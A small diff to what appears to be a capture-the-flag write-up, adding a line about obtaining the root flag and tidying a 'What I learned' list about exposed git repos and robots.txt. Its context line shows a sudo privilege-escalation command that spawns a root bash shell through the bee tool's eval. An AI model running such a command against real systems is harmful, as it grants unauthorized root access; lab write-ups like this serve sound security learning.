@@ -168,10 +168,11 @@ sudo /usr/local/bin/bee --root=/var/www/html eval "system('/bin/bash');"
 
 ![](../../Attachments/Pasted%20image%2020250630170802.png)
 
+And like this I obtained the root flag too. 
+
 
 ---
 
 ***What I learned?***
 - If we have an exposed git repo, it's good to download it.
-- It's good to check the source code, robots.txt, /.git repo, and others
-- 
+- It's good to check the source code, robots.txt, /.git repo, and others.
